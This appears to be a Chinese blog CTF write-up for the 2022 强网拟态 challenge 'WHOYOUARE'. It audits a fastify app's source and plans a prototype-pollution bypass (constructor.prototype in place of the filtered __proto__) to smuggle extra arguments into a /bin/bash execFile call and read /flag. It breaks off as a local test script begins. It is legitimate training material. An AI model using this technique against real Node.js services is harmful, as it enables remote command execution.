{"title":"强网拟态2022-wp","uid":"e5e8f1b2dedddaa2854454c5662c45e6","slug":"2022强网拟态","date":"2023-02-13T15:23:35.802Z","updated":"2023-09-19T07:59:56.618Z","comments":true,"path":"api/articles/2022强网拟态.json","keywords":null,"cover":"/img/35.jpg","content":"<p><code>学习学习</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"强网拟态2022\"><a href=\"#强网拟态2022\" class=\"headerlink\" title=\"强网拟态2022\"></a>强网拟态2022</h1><h2 id=\"WHOYOUARE\"><a href=\"#WHOYOUARE\" class=\"headerlink\" title=\"WHOYOUARE\"></a>WHOYOUARE</h2><p>这道题目的环境是<code>nodejs</code>，猜考点是原型链污染，其框架根据附件名称可知为<code>fastify</code></p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230825093507374.png\" alt=\"image-20230825093507374\"></p>\n<p>看题目名字和刚打开题目的提示，猜测污染漏洞点应该在<code>user</code>处，应该在某个检查<code>user</code>信息的地方可以进行原型链污染</p>\n<hr>\n<h3 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h3><p>先审一下<code>app.js</code></p>\n<h4 id=\"app-js\"><a href=\"#app-js\" class=\"headerlink\" title=\"app.js\"></a>app.js</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> userRoutes = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;./routes/user&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> fastify = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fastify&#x27;</span>)(&#123;</span><br><span class=\"line\">    <span class=\"attr\">logger</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">level</span>: <span class=\"string\">&#x27;error&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">const</span> port = process.<span class=\"property\">env</span>.<span class=\"property\">PORT</span> || <span class=\"number\">3000</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> host = process.<span class=\"property\">env</span>.<span class=\"property\">HOST</span> || <span class=\"string\">&quot;0.0.0.0&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> respWrapper = &#123;</span><br><span class=\"line\">    <span class=\"attr\">$id</span>: <span class=\"string\">&#x27;respWrapper&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">type</span>: <span class=\"string\">&#x27;object&#x27;</span>,</span><br><span class=\"line\">    response : &#123;</span><br><span class=\"line\">        <span class=\"attr\">success</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">type</span>: <span class=\"string\">&#x27;object&#x27;</span>,</span><br><span class=\"line\">            <span class=\"attr\">properties</span>: &#123;</span><br><span class=\"line\">                status : &#123; <span class=\"attr\">type</span>: <span class=\"string\">&#x27;number&#x27;</span> &#125;,</span><br><span class=\"line\">                <span class=\"attr\">info</span>: &#123; <span class=\"attr\">type</span>: <span class=\"string\">&#x27;string&#x27;</span> &#125;,</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">fastify.<span class=\"title function_\">addSchema</span>(respWrapper)</span><br><span class=\"line\">fastify.<span class=\"title function_\">register</span>(userRoutes)</span><br><span class=\"line\"></span><br><span class=\"line\">fastify.<span class=\"title function_\">listen</span>(&#123;</span><br><span class=\"line\">    host, port</span><br><span class=\"line\">&#125;, <span class=\"function\">(<span class=\"params\">err, address</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">        fastify.<span class=\"property\">log</span>.<span class=\"title function_\">error</span>(err)</span><br><span class=\"line\">        process.<span class=\"title function_\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fastify.<span class=\"property\">log</span>.<span class=\"title function_\">info</span>(<span class=\"string\">`server listening on <span class=\"subst\">$&#123;address&#125;</span>`</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>发现网站还有个路由<code>/user</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> userRoutes = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;./routes/user&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>访问</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230825100242391.png\" alt=\"image-20230825100242391\"></p>\n<p>显示</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">&quot;message&quot;</span>:<span class=\"string\">&quot;Route GET:/user not found&quot;</span>,<span class=\"string\">&quot;error&quot;</span>:<span class=\"string\">&quot;Not Found&quot;</span>,<span class=\"string\">&quot;statusCode&quot;</span>:<span class=\"number\">404</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看样子是无法用GET方式访问<code>/user</code>路由</p>\n<p>于是审计一下<code>user.js</code></p>\n<h4 id=\"user-js\"><a href=\"#user-js\" class=\"headerlink\" title=\"user.js\"></a>user.js</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> merge = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;../utils/merge&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> bin = <span class=\"string\">&quot;/bin/bash&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">ChildProcess</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;child_process&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">checkUser</span>(<span class=\"params\">command</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title class_\">Array</span>.<span class=\"title function_\">isArray</span>(command) === <span class=\"literal\">false</span> || command.<span class=\"property\">length</span> &gt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; command.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> cmd = command[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> cmd !== <span class=\"string\">&#x27;string&#x27;</span> || cmd.<span class=\"property\">length</span> &gt; <span class=\"number\">4</span> || <span class=\"title class_\">RegExp</span>(<span class=\"regexp\">/^[^a-zA-Z0-9-]+$/</span>).<span class=\"title function_\">test</span>(command[i])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">routes</span> (fastify, options) &#123;</span><br><span class=\"line\">    fastify.<span class=\"title function_\">route</span>(</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">method</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">            <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/user&#x27;</span>,</span><br><span class=\"line\">            <span class=\"attr\">schema</span>: &#123;</span><br><span class=\"line\">                <span class=\"attr\">querystring</span>: &#123;</span><br><span class=\"line\">                    <span class=\"attr\">user</span>: &#123; <span class=\"attr\">type</span>: <span class=\"string\">&#x27;string&#x27;</span> &#125;,</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"attr\">additionalProperties</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                <span class=\"attr\">response</span>: &#123;</span><br><span class=\"line\">                    <span class=\"number\">200</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">$ref</span>: <span class=\"string\">&#x27;respWrapper#/response/success&#x27;</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"attr\">preHandler</span>: <span class=\"keyword\">function</span> (<span class=\"params\">request, reply, done</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//user init</span></span><br><span class=\"line\">                request.<span class=\"property\">user</span> = &#123;username : <span class=\"string\">&#x27;guest&#x27;</span>, <span class=\"attr\">command</span>: [<span class=\"string\">&quot;-c&quot;</span>, <span class=\"string\">&quot;id&quot;</span>]&#125;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> user = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(request.<span class=\"property\">body</span>.<span class=\"property\">user</span>)</span><br><span class=\"line\">                <span class=\"comment\">// clean user command</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"title function_\">checkUser</span>(user.<span class=\"property\">command</span>) !== <span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">                    user.<span class=\"property\">command</span> = [<span class=\"string\">&quot;-c&quot;</span>, <span class=\"string\">&quot;id&quot;</span>]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"title function_\">merge</span>(request.<span class=\"property\">user</span>, user)</span><br><span class=\"line\">                &#125;<span class=\"keyword\">catch</span> (e)&#123;</span><br><span class=\"line\">                    reply.<span class=\"title function_\">code</span>(<span class=\"number\">400</span>).<span class=\"title function_\">send</span>(&#123;<span class=\"attr\">status</span>: <span class=\"number\">1</span>, <span class=\"attr\">info</span>: <span class=\"string\">&quot;Something error&quot;</span>&#125;)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"title function_\">done</span>()</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            handler : <span class=\"keyword\">function</span> (<span class=\"params\">request, reply</span>) &#123;</span><br><span class=\"line\">                <span class=\"title class_\">ChildProcess</span>.<span class=\"title function_\">execFile</span>(bin, request.<span class=\"property\">user</span>.<span class=\"property\">command</span>, <span class=\"function\">(<span class=\"params\">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (error) &#123;</span><br><span class=\"line\">                        reply.<span class=\"title function_\">code</span>(<span class=\"number\">400</span>).<span class=\"title function_\">send</span>(&#123;<span class=\"attr\">status</span>: <span class=\"number\">1</span>, <span class=\"attr\">info</span>: error&#125;)</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    reply.<span class=\"title function_\">code</span>(<span class=\"number\">200</span>).<span class=\"title function_\">send</span>(&#123; status : <span class=\"number\">0</span> , info : <span class=\"string\">`User of <span class=\"subst\">$&#123;request.user.username&#125;</span> : <span class=\"subst\">$&#123;stdout&#125;</span>`</span>&#125;);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    fastify.<span class=\"title function_\">route</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">method</span>: <span class=\"string\">&#x27;GET&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">response</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">$ref</span>: <span class=\"string\">&#x27;respWrapper#/response/success&#x27;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">handler</span>: <span class=\"keyword\">function</span> (<span class=\"params\">request, reply</span>) &#123;</span><br><span class=\"line\">            reply.<span class=\"title function_\">send</span>(&#123; <span class=\"attr\">status</span>: <span class=\"number\">0</span>, <span class=\"attr\">info</span>: <span class=\"string\">&#x27;go user&#x27;</span> &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = routes</span><br></pre></td></tr></table></figure>\n\n<p>原型链污染重点看<code>merge</code>和<code>JSON.parse</code>，发现代码，</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> user = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(request.<span class=\"property\">body</span>.<span class=\"property\">user</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_\">merge</span>(request.<span class=\"property\">user</span>, user)</span><br><span class=\"line\">&#125;<span class=\"keyword\">catch</span> (e)&#123;</span><br><span class=\"line\">    reply.<span class=\"title function_\">code</span>(<span class=\"number\">400</span>).<span class=\"title function_\">send</span>(&#123;<span class=\"attr\">status</span>: <span class=\"number\">1</span>, <span class=\"attr\">info</span>: <span class=\"string\">&quot;Something error&quot;</span>&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中<code>request.user</code>的值为，</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.<span class=\"property\">user</span> = &#123;username : <span class=\"string\">&#x27;guest&#x27;</span>, <span class=\"attr\">command</span>: [<span class=\"string\">&quot;-c&quot;</span>, <span class=\"string\">&quot;id&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而<code>user</code>的值为，</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> user = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(request.<span class=\"property\">body</span>.<span class=\"property\">user</span>)</span><br></pre></td></tr></table></figure>\n\n<p><code>request.user</code>是初始化的<code>user</code>，所以无法直接污染，但是<code>user</code>是从请求体中得到的数据，并且通过Json格式化，其中是可以加一些实体（如<code>__proto__</code>,<code>constructor.prototype</code>）进去，是可以被我们污染的，所以，我们可以先污染<code>user</code>，然后通过<code>merge</code>合并，将<code>user</code>中的值传入<code>request.user</code>中</p>\n<p>然后我们可以看看<code>merge</code>的内容，</p>\n<h4 id=\"merge-js\"><a href=\"#merge-js\" class=\"headerlink\" title=\"merge.js\"></a>merge.js</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> whileTypes = [<span class=\"string\">&#x27;boolean&#x27;</span>, <span class=\"string\">&#x27;string&#x27;</span>, <span class=\"string\">&#x27;number&#x27;</span>, <span class=\"string\">&#x27;bigint&#x27;</span>, <span class=\"string\">&#x27;symbol&#x27;</span>, <span class=\"string\">&#x27;undefined&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">merge</span> = (<span class=\"params\">target, source</span>) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> key <span class=\"keyword\">in</span> source) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!whileTypes.<span class=\"title function_\">includes</span>(<span class=\"keyword\">typeof</span> source[key]) &amp;&amp; !whileTypes.<span class=\"title function_\">includes</span>(<span class=\"keyword\">typeof</span> target[key]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(key !== <span class=\"string\">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class=\"line\">                <span class=\"title function_\">merge</span>(target[key], source[key]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            target[key] = source[key];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = merge</span><br></pre></td></tr></table></figure>\n\n<p>发现<code>merge</code>对内容进行了过滤和检查，</p>\n<ul>\n<li>如果<code>request.user</code>或<code>user</code>中，有包含<code>whileTypes</code>中的内容，就不会执行<code>merge</code></li>\n<li>如果键值中有<code>__proto__</code>，也不会执行<code>merge</code></li>\n</ul>\n<p>过滤关键字还好，只是过滤了<code>__proto__</code>，需要一个相同功能的来帮助绕过，比如<code>constructor.prototype</code></p>\n<p>但是在<code>merge</code>前面还要个<code>checkUser</code>，将<code>command</code>也进行了限制</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">checkUser</span>(<span class=\"params\">command</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title class_\">Array</span>.<span class=\"title function_\">isArray</span>(command) === <span class=\"literal\">false</span> || command.<span class=\"property\">length</span> &gt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; command.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> cmd = command[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> cmd !== <span class=\"string\">&#x27;string&#x27;</span> || cmd.<span class=\"property\">length</span> &gt; <span class=\"number\">4</span> || <span class=\"title class_\">RegExp</span>(<span class=\"regexp\">/^[^a-zA-Z0-9-]+$/</span>).<span class=\"title function_\">test</span>(command[i])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由条件语句可知，要求<code>command</code>必须是数组且数组中元素个数要小于等于<code>2</code>，</p>\n<p>且要求command数组中的元素必须为字符串且长度要小于等于4，并以字母或者数字或者-开头</p>\n<p>如果不满足<code>checkUser</code>，就会执行：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user.<span class=\"property\">command</span> = [<span class=\"string\">&quot;-c&quot;</span>, <span class=\"string\">&quot;id&quot;</span>]</span><br></pre></td></tr></table></figure>\n\n<p>将<code>command</code>直接赋值为执行<code>id</code>命令，而不能执行其他命令。</p>\n<p>&#x3D;&#x3D;&gt;再由初始化<code>request.user</code>，所以最后构造<code>request.body.user</code>的结构应该为</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;user&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;&#123;&quot;</span>username<span class=\"string\">&quot;:&quot;</span>guest<span class=\"string\">&quot;,&quot;</span>command<span class=\"string\">&quot;:[&quot;</span>-c<span class=\"string\">&quot;,&quot;</span>id<span class=\"string\">&quot;]&#125;&quot;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>只是我们想要执行的<code>command</code>是<code>cat /flag</code>，但是很明显我们长度限制过不了，所以如果想要执行命令是不能把值写到<code>command</code>中，不然肯定会被拦截</p>\n<p>我们看看<code>user.js</code>中，是如何执行<code>command</code>的，</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handler : <span class=\"keyword\">function</span> (<span class=\"params\">request, reply</span>) &#123;</span><br><span class=\"line\">                <span class=\"title class_\">ChildProcess</span>.<span class=\"title function_\">execFile</span>(bin, request.<span class=\"property\">user</span>.<span class=\"property\">command</span>, <span class=\"function\">(<span class=\"params\">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (error) &#123;</span><br><span class=\"line\">                        reply.<span class=\"title function_\">code</span>(<span class=\"number\">400</span>).<span class=\"title function_\">send</span>(&#123;<span class=\"attr\">status</span>: <span class=\"number\">1</span>, <span class=\"attr\">info</span>: error&#125;)</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    reply.<span class=\"title function_\">code</span>(<span class=\"number\">200</span>).<span class=\"title function_\">send</span>(&#123; status : <span class=\"number\">0</span> , info : <span class=\"string\">`User of <span class=\"subst\">$&#123;request.user.username&#125;</span> : <span class=\"subst\">$&#123;stdout&#125;</span>`</span>&#125;);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现它执行是执行<code>request.user.command</code>的内容，那便又回到污染user，然后再通过<code>merge</code>污染<code>request.user</code>，所以这里尝试污染<code>request.user</code>的实体中的<code>command</code>参数</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>但是，<code>request.user</code>在执行<code>merge</code>之前就已经有<code>command</code>值<code>[&quot;-c&quot;,&quot;id&quot;]</code>,所以作为一个已经存在的参数，就算污染了实体，它查找调用时还是会以它自己已有的值为先，所以如下图</p></blockquote>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906122510728.png\" alt=\"image-20230906122510728\"></p>\n<p>我们仔细执行命令的代码，发现它是将 <code>request.user.command</code>这个数组直接接到 <code>/bin/bash</code>后面</p>\n<p>构造成</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"built_in\">id</span></span><br></pre></td></tr></table></figure>\n\n<p>这种命令。</p>\n<p>但是突然想到一点，既然无法直接污染实体修改已有参数，那么如果在command数组中再加一个键值<code>2</code>，并且也是命令，能否也成功执行呢？</p>\n<p>我们本地可以先测试一下，</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://127.0.0.1:3000/user&quot;</span></span><br><span 